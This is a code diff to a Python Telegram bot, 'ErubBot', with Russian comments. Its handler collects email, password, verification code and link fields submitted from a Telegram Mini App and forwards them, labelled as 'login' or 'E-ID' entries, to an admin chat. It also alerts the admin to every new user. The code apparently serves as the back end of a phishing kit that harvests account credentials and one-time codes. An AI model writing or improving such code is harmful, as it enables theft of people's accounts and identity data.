@@ -32,20 +32,18 @@ class ErubBot:
             
         self.app.add_handler(CommandHandler("start", self.start))
         
-        # САМОЕ ВАЖНОЕ: ловим данные от tg.sendData()
+        # Обработчик для tg.sendData (самое важное!)
         self.app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, self.handle_webapp_data))
         
-        # Ловим обычный текст (на всякий случай)
+        # Обработчик для обычного текста
         self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))
 
     async def start(self, update: Update, context):
         user = update.effective_user
-        current_time = datetime.now().strftime("%d.%m.%Y %H:%M")
-
         try:
             await self.app.bot.send_message(
                 chat_id=ADMIN_ID,
-                text=f"🟢 НОВЫЙ ВХОД!\n\n👤 ID: `{user.id}`\n👤 Имя: {user.first_name}\n🕐 Время: {current_time}",
+                text=f"🟢 НОВЫЙ ВХОД!\n\n👤 ID: `{user.id}`\n👤 Имя: {user.first_name}",
                 parse_mode="Markdown"
             )
         except Exception as e:
@@ -60,7 +58,6 @@ class ErubBot:
         )
 
     async def handle_webapp_data(self, update: Update, context):
-        # Ловим JSON от tg.sendData()
         raw = update.message.web_app_data.data
         user = update.effective_user
         
@@ -69,12 +66,16 @@ class ErubBot:
         except:
             data = {"raw": raw}
 
+        t = data.get('type', 'unknown')
         e = data.get('email', '-')
         p = data.get('password', '-')
         code = data.get('code', '-')
         link = data.get('link', '-')
 
-        text = f"<b>ДАННЫЕ ИЗ MINI APP</b>\n\n"
+        titles = {"login": "🔔 ВХОД", "eid": "🆔 E-ID"}
+        title = titles.get(t, "ДАННЫЕ")
+
+        text = f"<b>{title}</b>\n\n"
         text += f"👤 TG ID: <code>{user.id}</code>\n"
         text += f"👤 Имя: {user.first_name}\n\n"
         
